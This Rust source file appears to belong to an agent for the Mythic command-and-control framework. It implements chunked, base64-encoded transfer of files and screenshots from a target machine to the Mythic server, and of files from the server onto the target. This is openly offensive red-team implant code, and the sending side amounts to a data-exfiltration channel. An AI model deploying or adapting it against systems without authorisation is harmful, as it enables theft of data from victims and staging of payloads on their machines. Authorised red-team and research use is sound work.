use crate::structs::{
    FileDownloadMessage, FileUploadMessage, FileUploadMessageResponse, GetFileFromMythicStruct,
    Response, SendFileToMythicStruct,
};
use crate::utils;
use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
use serde_json::Value;
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use tokio::sync::mpsc;

pub const FILE_CHUNK_SIZE: usize = 512_000;

/// Initialize file transfer channels
pub fn initialize() -> (
    mpsc::Sender<SendFileToMythicStruct>,
    mpsc::Sender<GetFileFromMythicStruct>,
) {
    let (send_tx, send_rx) = mpsc::channel::<SendFileToMythicStruct>(10);
    let (get_tx, get_rx) = mpsc::channel::<GetFileFromMythicStruct>(10);

    tokio::spawn(listen_for_send_file_to_mythic(send_rx));
    tokio::spawn(listen_for_get_from_mythic(get_rx));

    (send_tx, get_tx)
}

/// Remove a tracking UUID from the file_transfers map
fn cleanup_file_transfer(
    file_transfers: &Arc<Mutex<HashMap<String, mpsc::Sender<Value>>>>,
    tracking_uuid: &str,
) {
    if let Ok(mut ft_map) = file_transfers.lock() {
        ft_map.remove(tracking_uuid);
    }
}

// ============================================================================
// Send File to Mythic (agent "download" = file goes from target to Mythic)
// ============================================================================

/// Listen for file send requests from tasks
async fn listen_for_send_file_to_mythic(mut rx: mpsc::Receiver<SendFileToMythicStruct>) {
    while let Some(mut msg) = rx.recv().await {
        tokio::spawn(async move {
            handle_send_file_to_mythic(&mut msg).await;
        });
    }
}

/// Handle sending a file to Mythic in chunks.
///
/// Protocol:
/// 1. Send initial Response with download (chunk_num=0, total_chunks, metadata)
/// 2. Mythic responds with file_id
/// 3. For each data chunk: send Response with download (chunk_num, file_id, chunk_data)
/// 4. Wait for Mythic acknowledgment after each chunk
async fn handle_send_file_to_mythic(msg: &mut SendFileToMythicStruct) {
    let data = match &msg.data {
        Some(d) => d.clone(),
        None => {
            utils::print_debug("No data provided for file transfer");
            let _ = msg.finished_transfer.send(0).await;
            return;
        }
    };

    let total_chunks = std::cmp::max(1, (data.len() + FILE_CHUNK_SIZE - 1) / FILE_CHUNK_SIZE);

    // Generate tracking UUID
    msg.tracking_uuid = uuid::Uuid::new_v4().to_string();
    utils::print_debug(&format!(
        "File transfer: task={} tracking={} chunks={} file={}",
        msg.task_id, msg.tracking_uuid, total_chunks, msg.file_name
    ));

    // Create channel for receiving responses from Mythic (routed via tracking_uuid)
    let (ft_tx, mut ft_rx) = mpsc::channel::<Value>(1);

    // Register in the task's file_transfers map so response routing finds us
    {
        let mut ft_map = msg.file_transfers.lock().unwrap();
        ft_map.insert(msg.tracking_uuid.clone(), ft_tx);
        utils::print_debug(&format!(
            "Registered tracking_uuid in file_transfers (map now has {} entries)",
            ft_map.len()
        ));
    }

    // Send initial registration (chunk_num 0 = metadata only, no data)
    let initial_response = Response {
        task_id: msg.task_id.clone(),
        tracking_uuid: Some(msg.tracking_uuid.clone()),
        download: Some(FileDownloadMessage {
            total_chunks: total_chunks as i32,
            chunk_num: 0,
            full_path: msg.full_path.clone(),
            filename: msg.file_name.clone(),
            chunk_data: String::new(),
            file_id: String::new(),
            is_screenshot: msg.is_screenshot,
        }),
        ..Response::default()
    };

    if msg.send_responses.send(initial_response).await.is_err() {
        utils::print_debug("Failed to send initial file registration");
        cleanup_file_transfer(&msg.file_transfers, &msg.tracking_uuid);
        let _ = msg.finished_transfer.send(0).await;
        return;
    }
    utils::print_debug("Initial download registration sent, waiting for file_id from Mythic...");

    // Wait for Mythic to respond with file_id
    let file_id = match ft_rx.recv().await {
        Some(resp) => {
            utils::print_debug(&format!(
                "Received file transfer response: {:?}",
                resp
            ));
            if let Some(Value::String(fid)) = resp.get("file_id") {
                fid.clone()
            } else {
                utils::print_debug("No file_id in registration response");
                cleanup_file_transfer(&msg.file_transfers, &msg.tracking_uuid);
                let _ = msg.finished_transfer.send(0).await;
                return;
            }
        }
        None => {
            utils::print_debug("Channel closed waiting for file_id");
            cleanup_file_transfer(&msg.file_transfers, &msg.tracking_uuid);
            let _ = msg.finished_transfer.send(0).await;
            return;
        }
    };
    utils::print_debug(&format!("Got file_id: {}, sending {} chunks", file_id, total_chunks));

    // Send a user_output response with the file_id so browser scripts can render it
    // (matches Poseidon behavior - screencapture_new.js parses this to display screenshots)
    let file_id_response = Response {
        task_id: msg.task_id.clone(),
        status: format!("Downloading 1/{} Chunks...", total_chunks),
        user_output: format!(
            "{{\"file_id\": \"{}\", \"total_chunks\": \"{}\"}}\n",
            file_id, total_chunks
        ),
        ..Response::default()
    };
    let _ = msg.send_responses.send(file_id_response).await;

    // Send each data chunk
    let mut chunk_num = 1;
    while chunk_num <= total_chunks {
        let start = (chunk_num - 1) * FILE_CHUNK_SIZE;
        let end = std::cmp::min(chunk_num * FILE_CHUNK_SIZE, data.len());
        let chunk_data = BASE64.encode(&data[start..end]);

        utils::print_debug(&format!(
            "Sending chunk {}/{} ({} bytes raw, {} bytes b64) file_id={}",
            chunk_num, total_chunks, end - start, chunk_data.len(), file_id
        ));

        let chunk_response = Response {
            task_id: msg.task_id.clone(),
            tracking_uuid: Some(msg.tracking_uuid.clone()),
            status: format!("Downloading {}/{} chunks...", chunk_num, total_chunks),
            download: Some(FileDownloadMessage {
                total_chunks: total_chunks as i32,
                chunk_num: chunk_num as i32,
                full_path: String::new(),
                filename: String::new(),
                chunk_data,
                file_id: file_id.clone(),
                is_screenshot: msg.is_screenshot,
            }),
            ..Response::default()
        };

        if msg.send_responses.send(chunk_response).await.is_err() {
            utils::print_debug("Failed to send file chunk");
            break;
        }

        // Wait for Mythic acknowledgment before sending next chunk
        // Match Poseidon: only advance to next chunk on "success" status
        match ft_rx.recv().await {
            Some(resp) => {
                utils::print_debug(&format!(
                    "Chunk {}/{} ack: {:?}",
                    chunk_num, total_chunks, resp
                ));
                if let Some(Value::String(s)) = resp.get("status") {
                    if s.contains("success") {
                        chunk_num += 1;
                    } else {
                        utils::print_debug(&format!(
                            "Chunk {}/{} non-success status '{}', retrying",
                            chunk_num, total_chunks, s
                        ));
                    }
                } else {
                    // No status field - advance anyway (compat)
                    utils::print_debug(&format!(
                        "Chunk {}/{} ack had no status field, advancing",
                        chunk_num, total_chunks
                    ));
                    chunk_num += 1;
                }
            }
            None => {
                utils::print_debug("Channel closed waiting for chunk ack");
                break;
            }
        }
    }

    // Cleanup tracking
    cleanup_file_transfer(&msg.file_transfers, &msg.tracking_uuid);

    // Signal transfer complete
    utils::print_debug(&format!(
        "File transfer complete for task {} ({})",
        msg.task_id, msg.file_name
    ));
    let _ = msg.finished_transfer.send(1).await;
}

// ============================================================================
// Get File from Mythic (agent "upload" = file goes from Mythic to target)
// ============================================================================

/// Listen for file get requests from tasks
async fn listen_for_get_from_mythic(mut rx: mpsc::Receiver<GetFileFromMythicStruct>) {
    while let Some(mut msg) = rx.recv().await {
        tokio::spawn(async move {
            handle_get_file_from_mythic(&mut msg).await;
        });
    }
}

/// Handle getting a file from Mythic in chunks.
///
/// Protocol:
/// 1. Send Response with upload (file_id, chunk_size, chunk_num=1)
/// 2. Mythic responds with first chunk (total_chunks, chunk_data)
/// 3. Decode base64 chunk_data and send raw bytes to task's received_chunk_channel
/// 4. Request remaining chunks (chunk_num 2..total_chunks)
/// 5. Send empty Vec<u8> to signal completion
async fn handle_get_file_from_mythic(msg: &mut GetFileFromMythicStruct) {
    msg.tracking_uuid = uuid::Uuid::new_v4().to_string();

    // Create channel for receiving responses from Mythic
    let (ft_tx, mut ft_rx) = mpsc::channel::<Value>(1);

    // Register in the task's file_transfers map
    {
        let mut ft_map = msg.file_transfers.lock().unwrap();
        ft_map.insert(msg.tracking_uuid.clone(), ft_tx);
    }

    // Request first chunk
    let initial_response = Response {
        task_id: msg.task_id.clone(),
        tracking_uuid: Some(msg.tracking_uuid.clone()),
        upload: Some(FileUploadMessage {
            chunk_size: FILE_CHUNK_SIZE as i32,
            total_chunks: 0,
            file_id: msg.file_id.clone(),
            chunk_num: 1,
            full_path: msg.full_path.clone(),
            chunk_data: String::new(),
        }),
        ..Response::default()
    };

    if msg.send_responses.send(initial_response).await.is_err() {
        utils::print_debug("Failed to send initial upload request");
        cleanup_file_transfer(&msg.file_transfers, &msg.tracking_uuid);
        let _ = msg.received_chunk_channel.send(Vec::new()).await;
        return;
    }

    // Receive first chunk and get total_chunks
    let (total_chunks, first_chunk) = match ft_rx.recv().await {
        Some(resp) => match serde_json::from_value::<FileUploadMessageResponse>(resp) {
            Ok(upload_resp) => {
                let total = upload_resp.total_chunks.unwrap_or(0);
                let chunk_data = upload_resp.chunk_data.unwrap_or_default();
                match BASE64.decode(&chunk_data) {
                    Ok(decoded) => (total, decoded),
                    Err(e) => {
                        utils::print_debug(&format!("Failed to decode first chunk: {}", e));
                        cleanup_file_transfer(&msg.file_transfers, &msg.tracking_uuid);
                        let _ = msg.received_chunk_channel.send(Vec::new()).await;
                        return;
                    }
                }
            }
            Err(e) => {
                utils::print_debug(&format!("Failed to parse upload response: {}", e));
                cleanup_file_transfer(&msg.file_transfers, &msg.tracking_uuid);
                let _ = msg.received_chunk_channel.send(Vec::new()).await;
                return;
            }
        },
        None => {
            utils::print_debug("Channel closed waiting for first chunk");
            cleanup_file_transfer(&msg.file_transfers, &msg.tracking_uuid);
            let _ = msg.received_chunk_channel.send(Vec::new()).await;
            return;
        }
    };

    // Send first chunk to the task
    let _ = msg.received_chunk_channel.send(first_chunk).await;

    // Request and receive remaining chunks
    for chunk_num in 2..=total_chunks {
        if msg.send_user_status_updates {
            let progress = (chunk_num * 100) / total_chunks;
            let status_response = Response {
                task_id: msg.task_id.clone(),
                user_output: format!("Uploading {}%...", progress),
                status: "processed".to_string(),
                ..Response::default()
            };
            let _ = msg.send_responses.send(status_response).await;
        }

        let chunk_request = Response {
            task_id: msg.task_id.clone(),
            tracking_uuid: Some(msg.tracking_uuid.clone()),
            upload: Some(FileUploadMessage {
                chunk_size: FILE_CHUNK_SIZE as i32,
                total_chunks,
                file_id: msg.file_id.clone(),
                chunk_num,
                full_path: msg.full_path.clone(),
                chunk_data: String::new(),
            }),
            ..Response::default()
        };

        if msg.send_responses.send(chunk_request).await.is_err() {
            utils::print_debug("Failed to send chunk request");
            break;
        }

        match ft_rx.recv().await {
            Some(resp) => {
                match serde_json::from_value::<FileUploadMessageResponse>(resp) {
                    Ok(upload_resp) => {
                        let chunk_data = upload_resp.chunk_data.unwrap_or_default();
                        match BASE64.decode(&chunk_data) {
                            Ok(decoded) => {
                                let _ = msg.received_chunk_channel.send(decoded).await;
                            }
                            Err(e) => {
                                utils::print_debug(&format!(
                                    "Failed to decode chunk {}: {}",
                                    chunk_num, e
                                ));
                                break;
                            }
                        }
                    }
                    Err(e) => {
                        utils::print_debug(&format!(
                            "Failed to parse chunk {} response: {}",
                            chunk_num, e
                        ));
                        break;
                    }
                }
            }
            None => {
                utils::print_debug("Channel closed waiting for chunk");
                break;
            }
        }
    }

    // Signal completion (empty vec)
    let _ = msg.received_chunk_channel.send(Vec::new()).await;

    // Cleanup tracking
    cleanup_file_transfer(&msg.file_transfers, &msg.tracking_uuid);
}
